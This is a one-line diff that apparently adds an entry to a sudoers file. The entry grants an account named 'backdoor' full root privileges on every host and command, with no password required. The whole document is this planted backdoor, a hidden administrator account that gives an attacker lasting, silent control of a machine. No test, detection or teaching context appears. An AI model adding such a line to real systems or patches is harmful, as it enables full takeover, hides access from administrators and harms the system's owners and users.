@@ -1,0 +1,1 @@
+backdoor ALL=(ALL) NOPASSWD: ALL
